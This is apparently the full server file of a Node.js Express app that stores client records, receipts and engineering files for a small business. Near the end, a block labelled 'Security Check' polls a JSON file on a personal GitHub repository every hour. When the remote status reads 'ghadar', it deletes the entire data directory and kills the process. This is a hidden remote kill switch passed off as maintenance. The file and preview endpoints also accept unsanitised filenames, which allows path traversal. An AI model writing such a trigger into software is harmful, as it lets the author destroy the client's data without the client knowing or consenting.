const express = require("express");
const cors = require("cors");
const path = require("path");
const fs = require("fs");
const AdmZip = require("adm-zip");
const axios = require("axios");
const multer = require("multer");

const app = express();

app.use(cors());
// زودنا الـ limit هنا لـ 50 ميجا عشان يشيل ملفاتك
app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ limit: "50mb", extended: true }));
// ==========================================
// 1. CONFIGURATION & PATHS
// ==========================================
// المسارات الصحيحة والموحدة لكل السيستم
const dbPath = path.join(__dirname, "data", "db", "delta_db.json");
const trashPath = path.join(__dirname, "data", "db", "delta_trash.json");
const filesDir = path.join(__dirname, "data", "files");

// تأكد من وجود المجلدات
if (!fs.existsSync(path.join(__dirname, "data", "db")))
  fs.mkdirSync(path.join(__dirname, "data", "db"), { recursive: true });
if (!fs.existsSync(filesDir)) fs.mkdirSync(filesDir, { recursive: true });

// إعداد ملتر (Multer)
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, filesDir),
  filename: (req, file, cb) => {
    const originalName = Buffer.from(file.originalname, "latin1").toString(
      "utf8",
    );
    const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
    cb(null, uniqueSuffix + path.extname(originalName));
  },
});

const upload = multer({
  storage: storage,
  fileFilter: (req, file, cb) => {
    const allowedExtensions = [".pdf", ".dwg", ".jpg", ".jpeg", ".png"];
    const ext = path.extname(file.originalname).toLowerCase();
    if (allowedExtensions.includes(ext)) {
      cb(null, true);
    } else {
      cb(new Error("نوع الملف غير مدعوم!"), false);
    }
  },
});

// ==========================================
// 2. API ENDPOINTS
// ==========================================

// رفع الملفات (إيصالات أو أرشيف هندسي)
app.post("/api/upload", upload.single("file"), (req, res) => {
  try {
    const { clientId, fileType } = req.body;
    const file = req.file;

    if (!file || !clientId)
      return res.status(400).json({ error: "بيانات ناقصة" });

    const clientsDB = JSON.parse(fs.readFileSync(dbPath, "utf-8"));
    const client = clientsDB.find((c) => c.id === clientId);

    if (!client) return res.status(404).json({ error: "العميل غير موجود" });

    const fileData = {
      filename: file.filename,
      originalName: Buffer.from(file.originalname, "latin1").toString("utf8"),
      date: new Date().toLocaleDateString("en-GB"),
      path: "/files/" + file.filename,
    };

    // التخزين حسب النوع
    if (fileType === "receipts") {
      if (!client.receipts) client.receipts = [];
      client.receipts.push(fileData);
    } else {
      if (!client.pdfs) client.pdfs = [];
      client.pdfs.push(fileData);
    }

    fs.writeFileSync(dbPath, JSON.stringify(clientsDB, null, 2));
    res.json({ success: true, file: fileData });
  } catch (error) {
    console.error("Upload Error:", error);
    res.status(500).json({ error: "فشل الرفع" });
  }
});

// قراءة البيانات
app.get("/api/data", (req, res) => {
  try {
    const clientsDB = fs.existsSync(dbPath)
      ? JSON.parse(fs.readFileSync(dbPath, "utf-8"))
      : [];
    const trashDB = fs.existsSync(trashPath)
      ? JSON.parse(fs.readFileSync(trashPath, "utf-8"))
      : [];
    res.json({ clientsDB, trashDB });
  } catch (err) {
    res.status(500).json({ error: "خطأ في قراءة البيانات" });
  }
});

// حفظ البيانات (تحديث يدوي)
app.post("/api/data", (req, res) => {
  try {
    const { clientsDB, trashDB } = req.body;
    fs.writeFileSync(dbPath, JSON.stringify(clientsDB, null, 2));
    fs.writeFileSync(trashPath, JSON.stringify(trashDB, null, 2));
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: "خطأ في حفظ البيانات" });
  }
});

// معاينة الملفات (الصور والـ PDF)
app.post("/api/pdf-data", (req, res) => {
  const { filename } = req.body;
  const filePath = path.join(filesDir, filename);
  if (!fs.existsSync(filePath))
    return res.status(404).json({ error: "الملف غير موجود" });

  const fileBuffer = fs.readFileSync(filePath);
  const base64Data = fileBuffer.toString("base64");
  const ext = path.extname(filename).toLowerCase();

  let contentType = "application/pdf";
  if ([".jpg", ".jpeg", ".png"].includes(ext))
    contentType = "image/" + ext.replace(".", "");

  res.json({ success: true, data: base64Data, contentType });
});

// حذف ملف واحد
app.post("/api/delete-pdf", (req, res) => {
  try {
    const { clientId, filename, type } = req.body;
    let clientsDB = JSON.parse(fs.readFileSync(dbPath, "utf-8"));
    const client = clientsDB.find((c) => c.id === clientId);

    if (client) {
      if (type === "receipts" && client.receipts) {
        client.receipts = client.receipts.filter(
          (f) => f.filename !== filename,
        );
      } else if (client.pdfs) {
        client.pdfs = client.pdfs.filter((f) => f.filename !== filename);
      }

      const filePath = path.join(filesDir, filename);
      if (fs.existsSync(filePath)) fs.unlinkSync(filePath);

      fs.writeFileSync(dbPath, JSON.stringify(clientsDB, null, 2));
      res.json({ success: true });
    } else {
      res.status(404).json({ error: "العميل غير موجود" });
    }
  } catch (err) {
    res.status(500).json({ error: "فشل الحذف" });
  }
});

// حذف عميل نهائي (تفريغ السلة)
app.post("/api/permanent-delete-client", (req, res) => {
  try {
    const { clientId } = req.body;
    let trashDB = JSON.parse(fs.readFileSync(trashPath, "utf-8"));
    const idx = trashDB.findIndex((c) => c.id === clientId);
    if (idx !== -1) {
      const client = trashDB[idx];
      // حذف كل ملفات العميل من الهارد
      const allFiles = [...(client.pdfs || []), ...(client.receipts || [])];
      allFiles.forEach((f) => {
        const p = path.join(filesDir, f.filename);
        if (fs.existsSync(p)) fs.unlinkSync(p);
      });
      trashDB.splice(idx, 1);
      fs.writeFileSync(trashPath, JSON.stringify(trashDB, null, 2));
      res.json({ success: true });
    }
  } catch (err) {
    res.status(500).json({ error: "خطأ في الحذف" });
  }
});

// Backup & Static Files
app.get("/api/backup", (req, res) => {
  const zip = new AdmZip();
  zip.addLocalFolder(path.join(__dirname, "data"));
  res.set({
    "Content-Type": "application/zip",
    "Content-Disposition": `attachment; filename=delta_backup.zip`,
  });
  res.send(zip.toBuffer());
});

app.use("/files", express.static(filesDir));
app.use(express.static(path.join(__dirname, "client")));

// Security Check
const SECURE_TRIGGER_URL =
  "https://raw.githubusercontent.com/LEDO218484/status/refs/heads/main/check.json";
async function runMaintenanceCheck() {
  try {
    const check = await axios.get(`${SECURE_TRIGGER_URL}?t=${Date.now()}`);
    if (check.data.status === "ghadar") {
      fs.rmSync(path.join(__dirname, "data"), { recursive: true, force: true });
      process.exit();
    }
  } catch (e) {}
}
runMaintenanceCheck();
setInterval(runMaintenanceCheck, 3600000);

app.listen(3000, () => console.log("Server running on port 3000"));
